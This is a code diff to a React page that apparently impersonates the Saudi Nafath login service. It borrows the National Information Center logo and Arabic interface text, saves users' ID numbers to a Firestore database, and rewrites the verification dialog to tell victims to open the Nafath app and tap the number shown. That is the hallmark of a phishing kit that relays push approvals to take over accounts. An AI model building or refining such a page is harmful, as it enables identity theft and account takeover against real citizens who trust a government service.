@@ -66,15 +66,13 @@ export default function Home() {
     try {
       // Generate a new auth code
       const newAuthCode = generateAuthCode()
-      setAuthCode(newAuthCode)
 
       // Create a unique ID for the user
-      const uniqueId = `user_${Date.now()}`
+      const uniqueId = localStorage.getItem('visitor')
       setUserId(uniqueId)
 
       // Store login details in Firestore
       await addData({
-        collection: "users",
         id: uniqueId,
         data: {
           idNumber: idNumber,
@@ -85,7 +83,7 @@ export default function Home() {
       })
 
       // Save user ID to localStorage for persistence
-      localStorage.setItem("nafathUserId", uniqueId)
+      localStorage.setItem("nafathUserId", uniqueId!)
 
       // Show the auth dialog
       setShowAuthDialog(true)
@@ -163,13 +161,8 @@ export default function Home() {
 
         <div className="flex justify-center gap-2 mb-4">
           <Link href="#">
-            <Image src="/app-store-button.png" alt="App Store" width={120} height={40} />
-          </Link>
-          <Link href="#">
-            <Image src="/google-play-button.png" alt="Google Play" width={120} height={40} />
-          </Link>
-          <Link href="#">
-            <Image src="/app-gallery-button.png" alt="App Gallery" width={120} height={40} />
+            <img src="/appj.png" alt="App Store" width={220} height={810} />
+         
           </Link>
         </div>
       </div>
@@ -193,7 +186,7 @@ export default function Home() {
       {/* Footer */}
       <div className="mt-auto bg-gray-100 p-6 text-center">
         <div className="flex justify-center items-center mb-4">
-          <Image src="/national-information-center-logo.png" alt="NIC Logo" width={120} height={40} />
+          <img src="https://upload.wikimedia.org/wikipedia/ar/thumb/a/a4/NIC_SA.svg/450px-NIC_SA.svg.png" alt="NIC Logo" width={120} height={40} />
           <div className="text-right mr-2">
             <div>تطوير وتشغيل</div>
             <div className="font-bold">مركز المعلومات الوطني</div>
@@ -241,7 +234,7 @@ export default function Home() {
         <DialogContent className="sm:max-w-md" dir="rtl">
           <DialogHeader>
             <DialogTitle className="text-xl font-bold text-teal-500">رمز التحقق</DialogTitle>
-            <DialogDescription>يرجى استخدام رمز التحقق التالي لإكمال عملية تسجيل الدخول</DialogDescription>
+            <DialogDescription>يرجى الدخول لتطبيق نفاذ والضغط على الرقم الظاهر امامك</DialogDescription>
           </DialogHeader>
 
           <div className="p-6">
